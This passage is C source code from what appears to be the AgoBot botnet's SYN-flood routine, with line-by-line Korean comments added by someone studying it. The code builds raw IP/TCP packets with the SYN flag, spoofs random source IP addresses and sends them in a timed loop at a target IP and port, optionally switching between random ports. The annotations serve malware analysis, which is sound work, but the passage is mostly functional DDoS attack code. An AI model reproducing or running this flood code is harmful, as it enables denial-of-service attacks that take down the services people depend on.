	addr_in.sin_family=AF_INET;
// AF_INET라는 주소 체계 사용 
	addr_in.sin_port=htons(TargetPort);
// 포트 설정 
// (htons함수는 2byte데이터를 네트워크 바이트(빅-엔디언 형식)로 비꾼다.)
	addr_in.sin_addr.s_addr=TargetIP;
// 아이피 설정 

/* SOCKADDR_IN Structure 참고
 https://msdn.microsoft.com/en-us/library/zx63b042.aspx */ 

	ipHeader.h_verlen=(4<<4|sizeof(ipHeader)/sizeof(unsigned long));
	ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader));
	ipHeader.ident=1; ipHeader.frag_and_flags=0; ipHeader.ttl=128;
	ipHeader.proto=IPPROTO_TCP; ipHeader.checksum=0; ipHeader.destIP=TargetIP;
// ipheader 설정 (ipheader Format: https://searchnetworking.techtarget.com/tutorial/Routing-First-Step-IP-header-format 참고)
	tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); tcpHeader.th_flag=2;
	tcpHeader.th_win=htons(16384); tcpHeader.th_urp=0; tcpHeader.th_ack=0;
// tcpheader 설정 (tcpheader Format: http://telescript.denayer.wenk.be/~hcr/cn/idoceo/tcp_header.html 참고)
/* 위 TCP Header Format 사이트를 보면 Flags 값에서 TCP Flags가 나뉘는것을 볼 수 있는데
   (TCP Header and Flags : https://www.winpcap.org/pipermail/winpcap-users/2006-July/001200.html)
   위 사이트를 참고하면 tcpHeader.th_flag=2; 이 부분이 TCP Flags를 SYN으로 설정하는것 임을  알 수 있다. */

	lTimerCount=GetTickCount();
/* GetTickCount Win32API를 이용해 컴퓨터가 시작된 후 경과된 시간 측정한다.
   DDos공격 전의 경과된 시간을 미리 lTimerCount변수에 저장한다.*/

	while(g_cMainCtrl.m_cDDOS.m_bDDOSing)
// AgoBot 봇넷에 사용된 g_cMainCtrl 함수가 사용됨을 알 수 있다. 
	{
	i++;
	tcpHeader.th_sum=0; tcpHeader.th_dport=htons(TargetPort);
// tcpHeader의 체크섬을 0으로 하고, TargetPort변수를 빅엔디언 형식으로 변환하고 목적지(받는) 쪽 포트로 설정한다. 

	psdHeader.daddr=ipHeader.destIP; psdHeader.mbz=0; psdHeader.ptcl=IPPROTO_TCP;
	psdHeader.tcpl=htons(sizeof(tcpHeader));
/* psdHeader는 구글링하니 .psd 확장자 관련 자료가 나와서 전체 포맷을 구하지는 못했고 
   대신 중국쪽 자료를 참고하니 가상 TCP헤더 역할을 한다고 한다.*/ 
	ipHeader.sourceIP=htonl(lSpoofIP);
// lSpoofIP변수를 빅엔디언 혁식으로 변환하고 출발지(보내는) 쪽 아이피로 설정한다. 

	tcpHeader.th_sport=htons((rand()%1001)+1000);
/* 출발지(보내는) 쪽 포트를 1000~2000 사이의 값을 빅엔디언 형식으로 설정한다.
   (srand함수가 사용되지 않았음으로 While문을 도는 동안 이 값은 고정이 된다.)*/ 
	tcpHeader.th_seq=htons((rand()<<16)|rand());
/* tcpHeader의 시퀸스 넘버를 랜덤한 값으로 빅엔디언 형식으로 설정한다. 
   (마찬가지로 srand함수가 사용되지 않았음으로 While문을 도는 동안 이 값은 고정이 된다.)*/ 
   
	psdHeader.saddr=ipHeader.sourceIP;

	memcpy(szSendBuf, &psdHeader, sizeof(psdHeader));
	memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
	tcpHeader.th_sum=checksum((unsigned short *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader));
// 체크섬 계산. 

	memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
	memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
	memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4);
	ipHeader.checksum=checksum((unsigned short *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader));
// 체크섬 계산.

	memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
// ip헤더를 복사. 

	rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(struct sockaddr*)&addr_in, sizeof(addr_in));
// TCP패킷을 전송.
	if(rect==SOCKET_ERROR) return false;
// rect값이 SOCKET_ERROR일때 false값을 반환. 

	if((GetTickCount()-lTimerCount)/1000>len) break;
/* 현재 컴퓨터가 시작된 후 경과된 시간(ms)에 공격을 수행하기 전 경과된 시간(ms)을 뺀 후
   1000을 나누어 ms(Millisecond)를 s(Second)로 바꾸어 len 변수 값 보다 크다면 함수를 나간다.(=공격을 멈춘다.)*/  
   
	if(bRandPort) { TargetPort=brandom(1000, 10000); }
// bRandPort변수 값이 0이 아니라면 TargetPort변수(목적지 포트) 값을 1000~10000 사이로 정한다.  
	szSpoofIP[0]=(char)brandom(0, 255); szSpoofIP[1]=(char)brandom(0, 255);
	szSpoofIP[2]=(char)brandom(0, 255); szSpoofIP[3]=(char)brandom(0, 255);
// szSpoofIP[0]~szSpoofIP[3]까지 문자 형식으로 0~255 중의 랜덤한 값으로 설정한다. 
	Sleep(delay);
// delay변수의 값 만큼 잠시 멈추어 딜레이를 준다. 
	}

	xClose(sock);
// 소켓 사용을 중지한다. (=닫는다). 
